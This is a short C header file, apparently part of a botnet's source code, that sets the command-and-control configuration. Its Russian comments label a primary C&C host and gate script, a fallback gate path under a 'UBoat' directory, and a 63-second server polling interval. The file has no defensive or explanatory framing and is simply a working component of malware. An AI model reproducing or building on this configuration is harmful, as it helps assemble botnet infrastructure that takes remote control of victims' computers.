#ifndef GATE_H
#define GATE_H
// Gate 1 Основной адрес C&C-сервера
static const char* GATE_HOST = "abc21.com";
static const char* GATE_PATH = "/css_r/gat2e1.php";
// Gate 2 Резервный сервер на случай недоступности основного
static const char* FALLBACK_GATE_HOST = "localhost1"; // here is your game 
static const char* FALLBACK_GATE_PATH = "/UBoat/gate1.php";
// Интервал опроса сервера(63 секунды)
static const int POLL_RATE = (1000 * 63 * 1);

#endif

